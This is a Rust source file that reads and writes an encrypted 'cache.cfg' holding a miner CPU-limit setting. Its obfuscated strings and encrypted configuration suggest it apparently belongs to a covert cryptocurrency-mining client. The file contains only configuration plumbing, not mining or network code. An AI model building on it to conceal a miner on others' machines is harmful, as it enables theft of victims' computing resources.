use serde::{ Deserialize, Serialize };
use shared::{
    constants::configs_encryption_key,
    utils::{
        encryption::{ convert_key_to_bytes, sauron_decrypt, sauron_encrypt },
        functions::{ get_current_exe, get_current_exe_dir },
    },
};
use anyhow::Result;
use obfstr::obfstr as s;
use std::fs::{ self, create_dir_all };

use crate::constants::default_miner_cpu_limit;
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub struct ClientCache {
    pub miner_cpu_limit_percentagee: u32,
}
impl Default for ClientCache {
    fn default() -> Self {
        Self {
            miner_cpu_limit_percentagee: default_miner_cpu_limit(),
        }
    }
}

pub fn load_client_cache_config() -> Result<ClientCache> {
    let file_path = get_current_exe_dir().join(s!("cache.cfg"));
    let default_config = ClientCache::default();
    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());

    if let Ok(encrypted_data) = fs::read(file_path.clone()) {
        if let Ok(decrypted_data) = sauron_decrypt(enc_key_bytes, &encrypted_data) {
            if let Ok(cnfg) = serde_json::from_slice(&decrypted_data) {
                return Ok(cnfg);
            }
        }
    }

    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(&default_config)?)?;
    create_dir_all(file_path.parent().unwrap())?;
    fs::write(file_path, encrypted_data)?;

    Ok(default_config)
}
pub fn write_client_cache_config(config: &ClientCache) -> Result<()> {
    let file_path = get_current_exe_dir().join(s!("cache.cfg"));
    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());
    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(config)?)?;
    create_dir_all(file_path.parent().unwrap())?;
    fs::write(file_path, encrypted_data)?;
    Ok(())
}
